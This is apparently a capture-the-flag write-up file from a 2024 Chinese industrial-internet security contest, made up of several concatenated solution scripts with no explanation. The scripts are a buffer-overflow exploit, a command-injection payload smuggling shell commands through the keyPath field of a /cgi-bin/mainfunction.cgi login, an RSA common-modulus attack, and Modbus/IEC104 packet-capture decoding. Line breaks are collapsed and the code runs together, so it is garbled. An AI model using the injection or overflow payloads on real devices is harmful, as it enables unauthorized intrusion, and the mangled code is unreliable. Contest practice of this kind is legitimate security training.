# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/2024中国工业互联网安全大赛智能家电行业赛道选拔赛决赛WriteUp.md
# TITLE: 2024中国工业互联网安全大赛智能家电行业赛道选拔赛决赛WriteUp
# CATEGORY: pwn

from pwn import *context.log_level='debug'sh=process('nc 192.3.2.19 6888',shell=True)text_addr=0x55555540090f-0x90f+0x87Apayload='a'*(32+8)+p64(text_addr)sh.recvuntil(':')sh.send(payload)sh.interactive()
import requestshost='http://192.3.2.238'def run_cmd(cmd):    try:        headers = {            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)Gecko/20100101 Firefox/75.0"            }        url = host + "/cgi-bin/mainfunction.cgi"        data = "action=login&keyPath=%27%0A%2fbin%2f" + cmd + "%0A%27&loginUser=a&loginPwd=a"        res = requests.post(url=url, data=data, timeout=(10, 15),headers=headers)        if res.status_code == 200:            return res.text        else:            print('error')            return 1        
except Exception as e:            return ""data=run_cmd('cat${IFS}/flag.txt')print(data)
vim -c :wq/tmp/flag /root/flag
from gmpy2 import *g,s,t = gcdext(e1,e2)m = pow(c1,s,n1)*pow(c2,t,n1)%n1from Crypto.Util.number import *print(long_to_bytes(m))
# cHZrcXs3MnAwMWwwNTlvMzE3N285MWszN2sxNGw1bW5sbTczM30=
tshark -r ics.pcapng -T fields -e modbus.regval_uint16 > modbus.txt
f = open("modbus.txt","r").readlines()
res = []for i in f:    if(len(i) > 1):        res += i[:-1].split(",")
count = 0for i in res:    if(i == "35152"):        count += 1        try:            fw.close()        
except:            None        fw = open("flag{}.png".format(count),"wb")        fw.write(bytes.fromhex(hex(int(i))[2:].rjust(4,"0")))    else:        fw.write(bytes.fromhex(hex(int(i))[2:].rjust(4,"0")))
tshark -r 1.pcapng -T fields -e iec60870_asdu.ioa > iec.txt
test='q{vplACMZY|F&Y}MUYA|nA}B&tBB&@yB%YBo&j'a=[0]*0x25for i in range(0x26):    for j in range(255):        if ord(test[i]) == j ^0x17:            print(chr(j),end='')            break
